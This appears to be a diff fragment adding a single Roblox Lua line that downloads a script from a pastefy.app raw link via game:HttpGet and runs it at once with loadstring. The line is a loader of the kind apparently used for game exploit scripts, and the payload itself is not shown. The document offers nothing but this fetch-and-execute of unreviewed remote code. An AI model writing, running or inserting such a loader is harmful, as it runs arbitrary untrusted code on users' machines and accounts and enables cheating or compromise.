@@ -1,0 +1,2 @@
+lua
+loadstring(game:HttpGet("https://pastefy.app/m78Sl81x/raw"))()
